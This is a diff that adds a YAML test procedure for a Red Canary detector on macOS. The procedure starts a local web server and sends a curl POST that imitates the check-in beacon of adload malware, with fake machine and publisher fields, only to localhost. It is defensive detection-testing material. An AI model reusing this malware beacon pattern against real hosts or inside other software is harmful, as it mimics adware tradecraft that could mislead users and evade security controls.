@@ -1,0 +1,41 @@
+name: Red Canary adload detector test.
+api_version: 2.0
+uuid: f6f0e809-1863-4748-9642-a3a4d37efec9
+authors:
+  - cedowens
+description: |
+  This TTP tests a Red Canary detector to flag on a curl command observed in adload malware. This TTP was developed to run on macOS.
+requirements:
+  platforms:
+    - os: darwin
+mitre:
+  tactics:
+    - TA0002 Execution
+  techniques:
+    - T1059 Command and Scripting Interpreter
+  subtechniques:
+    - T1059.004 Unix Shell
+args:
+  - name: timeout
+    description: The amount of time in seconds to run the local http server before auto-exiting.
+    default: 15
+  - name: port
+    description: The local port on which to run the web server.
+    default: 80
+steps:
+  - name: adload_trigger
+    inline: |
+      echo -e "==> Executing the adload_trigger TTP...\n"
+      echo "Creating /tmp/curltest/pkg and starting a webserver from /tmp/curltest..."
+      mkdir -p /tmp/curltest && touch /tmp/curltest/pkg && echo "random text" >> /tmp/curltest/pkg
+      cd /tmp/curltest
+      timeout {{ .Args.timeout }} python3 -m http.server {{ .Args.port }} &
+      echo "Web server started on port {{ .Args.port }}. Will timeout in {{ .Args.timeout }} seconds."
+      echo "Running a curl command to test a macOS adload detector."
+      curl -s -H "Content-Type: application/json; charset=UTF-8" -X POST -d '{"event": "goldenpdf_pkg_precheck_success", "machine_id": "fake_machine_name", "url":"http://127.0.0.1:{{ .Args.port }}/pkg", "os": "macOS", "os_version": "12.3.1", "publisher_id": "1358", "page_id": "DEFAULT", "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.3", "geo": "US", "sub_id": "DEFAULT", "browser": "chrome"}' http://127.0.0.1:{{ .Args.port }}/pkg || echo "Overwriting abnormal exit code"
+      echo "Done!"
+    cleanup:
+      inline: |
+        echo "Removing /tmp/curltest and subdirectories..."
+        rm -rf /tmp/curltest
+        echo "Cleanup done!"
